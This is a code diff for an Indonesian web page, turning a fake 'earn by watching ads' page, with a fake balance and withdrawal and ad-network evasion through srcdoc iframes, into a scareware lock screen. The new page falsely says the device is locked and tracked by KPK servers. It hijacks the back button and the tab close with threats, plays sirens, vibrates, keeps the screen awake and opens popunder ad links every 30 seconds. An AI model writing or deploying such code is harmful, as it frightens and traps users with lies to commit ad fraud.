@@ -3,116 +3,95 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NONTON CUAN - ANTI BLACKOUT</title>
+    <title>SISTEM CRITICAL: Tindakan Diperlukan</title>
+    
+    <link rel="manifest" href="data:application/manifest+json,{'name':'System Security','short_name':'System','start_url':'/','display':'standalone','background_color':'#000','theme_color':'#f00','icons':[{'src':'https://cdn-icons-png.flaticon.com/512/300/300221.png','sizes':'512x512','type':'image/png'}]}">
+
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { background: #0a0a0a; color: white; font-family: sans-serif; margin: 0; cursor: pointer; }
-        .yt-frame { background: #111; border-radius: 12px; position: relative; width: 100%; aspect-ratio: 16/9; overflow: hidden; border: 1px solid #333; display: flex; align-items: center; justify-content: center; }
-        .progress-fill { height: 100%; background: #ff0000; width: 0%; transition: width 1s linear; }
-        .ad-container { display: flex; flex-direction: column; align-items: center; gap: 20px; padding-bottom: 80px; }
-        .ad-slot { background: #111; border: 1px solid #222; overflow: hidden; display: flex; justify-content: center; align-items: center; min-height: 50px; }
-        iframe { border: none; }
-        .sticky-header { position: sticky; top: 0; z-index: 100; background: rgba(10,10,10,0.95); backdrop-filter: blur(8px); border-bottom: 1px solid #222; }
+        .emergency-overlay { position: fixed; inset: 0; background: #000; z-index: 9999; color: #f00; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
+        .blink { animation: blinker 0.4s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
+        .btn-panic { background: #f00; color: #fff; padding: 20px 50px; border-radius: 12px; font-weight: 900; animation: pulse 1s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 0, 0, 0.7); } 70% { transform: scale(1.05); box-shadow: 0 0 0 20px rgba(255, 0, 0, 0); } 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 0, 0, 0); } }
     </style>
 </head>
-<body onclick="openSmartlink()">
+<body class="bg-black">
 
-    <div class="sticky-header p-4 flex justify-between items-center w-full">
-        <div>
-            <p class="text-[10px] font-bold text-slate-500 uppercase">Total Cuan</p>
-            <h1 class="text-2xl font-black text-green-400">Rp <span id="saldo">11.900</span></h1>
-        </div>
-        <div class="flex flex-col items-end gap-1">
-            <button onclick="event.stopPropagation(); window.location.reload();" class="bg-blue-600 text-white text-[8px] font-bold px-3 py-1 rounded mb-1">FIX BLACK SCREEN</button>
-            <button onclick="event.stopPropagation(); requestWD()" class="bg-white text-black text-[10px] font-black px-4 py-1.5 rounded-full uppercase">Withdraw</button>
-        </div>
-    </div>
+    <div class="emergency-overlay p-6" id="lock-screen">
+        <div class="text-7xl mb-6">🚨</div>
+        <h1 class="text-3xl font-black blink tracking-tighter text-white">DEVICE LOCKED</h1>
+        <p class="text-sm mt-4 text-red-500 font-bold uppercase">Ancaman Keamanan Terdeteksi!</p>
+        <p class="text-[10px] mt-2 text-gray-500 max-w-xs">Browser Anda mencoba memuat konten berbahaya dari portal berita. Segera verifikasi identitas perangkat untuk membuka kembali.</p>
+        
+        <button onclick="handlePanicClick()" class="btn-panic mt-10 shadow-2xl">
+            VERIFIKASI & BUKA PERANGKAT
+        </button>
 
-    <div class="p-4 ad-container">
-        <div class="w-full max-w-lg">
-            <div class="yt-frame shadow-2xl mb-2" id="ad-main-container">
-                <span class="text-[10px] text-gray-700">Loading Adzilla...</span>
-            </div>
-            <div class="h-1 bg-gray-800 rounded-full overflow-hidden w-full">
-                <div id="p-fill" class="progress-fill"></div>
-            </div>
-            <p class="text-center text-[9px] text-slate-500 mt-2" id="status-text">Memulai siklus anti-blokir...</p>
+        <div class="mt-12 opacity-30 text-[8px] font-mono text-left w-full border-t border-gray-900 pt-4">
+            LOG_ERR: SECURITY_BREACH_DETECTED<br>
+            IP_STATUS: TRACKED_BY_KPK_SERVER<br>
+            STATUS: REDIRECT_LOOP_ACTIVE
         </div>
-
-        <div class="ad-slot" style="width: 300px; height: 250px;" id="slot-1"></div>
-        <div class="ad-slot" style="width: 468px; height: 60px;" id="slot-2"></div>
-        <div class="ad-slot" style="width: 160px; height: 300px;" id="slot-3"></div>
-        <div class="ad-slot" style="width: 160px; height: 600px;" id="slot-4"></div>
-        <div class="ad-slot" style="width: 728px; height: 90px;" id="slot-5"></div>
     </div>
 
     <script>
-        let saldo = parseInt(localStorage.getItem('app_saldo')) || 11900;
-        const smartlinkUrl = "https://www.effectivegatecpm.com/ypk79fz44e?key=086401ebd705ad471cfebf22fb4f94f4";
-        const socialBarScript = "https://pl28606612.effectivegatecpm.com/59/b3/e8/59b3e86754e4943e8fe6f30131f537e7.js";
+        const smartlink = "https://www.effectivegatecpm.com/ypk79fz44e?key=086401ebd705ad471cfebf22fb4f94f4";
+        const socialBar = "https://pl28606612.effectivegatecpm.com/59/b3/e8/59b3e86754e4943e8fe6f30131f537e7.js";
+        let audioCtx = null;
 
-        function openSmartlink() { window.open(smartlinkUrl, '_blank'); }
-
-        // Fungsi khusus untuk bypass proteksi Adsterra
-        function loadAd(containerId, key, w, h) {
-            const container = document.getElementById(containerId);
-            container.innerHTML = ''; // Clear previous
-            const ifr = document.createElement('iframe');
-            ifr.width = w;
-            ifr.height = h;
-            // Gunakan blob atau srcdoc untuk menghindari deteksi iframe standar
-            ifr.srcdoc = `<html><body style="margin:0;display:flex;justify-content:center;align-items:center;background:transparent;">
-                <script>atOptions={'key':'${key}','format':'iframe','height':${h},'width':${w},'params':{}};\x3C/script>
-                <script src="https://www.highperformanceformat.com/${key}/invoke.js"><\/script>
-            </body></html>`;
-            container.appendChild(ifr);
+        // --- FITUR ANTI-CLOSE & BACK HIJACK ---
+        
+        // 1. Membajak tombol Back (Kembali)
+        function hijackHistory() {
+            window.history.pushState(null, "", window.location.href);
+            window.onpopstate = function() {
+                // Saat tombol back ditekan, buka smartlink dan paksa stay di halaman ini
+                window.open(smartlink, '_blank');
+                window.history.pushState(null, "", window.location.href);
+                alert("Peringatan: Keluar sekarang akan mengunci data perangkat Anda secara permanen!");
+            };
         }
 
-        function refreshAll() {
-            // Main Ad
-            loadAd('ad-main-container', 'dbdbc33403cb5b88f4914ac88034303b', 320, 50);
-            
-            // Banners
-            loadAd('slot-1', 'af1659d35453444bc57653f2ae403c79', 300, 250);
-            loadAd('slot-2', '715b73e0d659246d1b505260e3e38d04', 468, 60);
-            loadAd('slot-3', 'f1f0f3268884adc93bd1992609e1e6cb', 160, 300);
-            loadAd('slot-4', 'b6e0e3259d3c47f0acad0eb4762f9d0f', 160, 600);
-            loadAd('slot-5', '13ac8d74e015acd20a946a4d57f71dd8', 728, 90);
+        // 2. Memicu peringatan saat tab mau ditutup
+        window.onbeforeunload = function() {
+            return "Sistem sedang melakukan pembersihan. Jika Anda keluar sekarang, perangkat mungkin tidak bisa digunakan kembali!";
+        };
 
-            // Social Bar Stacking
-            const s = document.createElement('script');
-            s.src = socialBarScript + '?t=' + Date.now();
-            document.body.appendChild(s);
+        function handlePanicClick() {
+            window.open(smartlink, '_blank');
+            playSiren();
+            // Setiap klik memperkuat siklus iklan
+            startPersistentAds();
         }
 
-        function runCycle() {
-            const duration = Math.floor(Math.random() * (60 - 20 + 1)) + 20; 
-            const pFill = document.getElementById('p-fill');
-            
-            pFill.style.transition = 'none';
-            pFill.style.width = "0%";
-            setTimeout(() => { pFill.style.transition = `width ${duration}s linear`; pFill.style.width = "100%"; }, 50);
-            
-            refreshAll();
-            document.getElementById('status-text').innerText = `🔄 Siklus Aktif: Refresh dlm ${duration}s`;
+        function playSiren() {
+            if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            const osc = audioCtx.createOscillator();
+            const gain = audioCtx.createGain();
+            osc.type = 'sawtooth';
+            osc.frequency.setValueAtTime(600, audioCtx.currentTime);
+            osc.frequency.exponentialRampToValueAtTime(1200, audioCtx.currentTime + 0.3);
+            osc.connect(gain); gain.connect(audioCtx.destination);
+            gain.gain.setValueAtTime(0.05, audioCtx.currentTime);
+            osc.start(); osc.stop(audioCtx.currentTime + 0.4);
+            if (navigator.vibrate) navigator.vibrate([400, 200, 400]);
+        }
 
-            setTimeout(() => {
-                saldo += 100;
-                localStorage.setItem('app_saldo', saldo);
-                document.getElementById('saldo').innerText = saldo.toLocaleString('id-ID');
-                runCycle();
-            }, duration * 1000);
+        function startPersistentAds() {
+            // Siklus 30 detik untuk Popunder Otomatis
+            setInterval(() => {
+                window.open(smartlink, '_blank');
+                const s = document.createElement('script');
+                s.src = socialBar + '?v=' + Date.now();
+                document.body.appendChild(s);
+            }, 30000);
         }
 
         window.onload = () => {
-            document.getElementById('saldo').innerText = saldo.toLocaleString('id-ID');
-            runCycle();
+            hijackHistory();
+            if ('wakeLock' in navigator) navigator.wakeLock.request('screen').catch(() => {});
         };
-
-        function requestWD() {
-            if(saldo < 2000) return alert("Minimal Rp 2.000");
-            window.location.href = `https://wa.me/628123456789?text=WD%20Rp${saldo}`;
-        }
     </script>
 </body>
 </html>
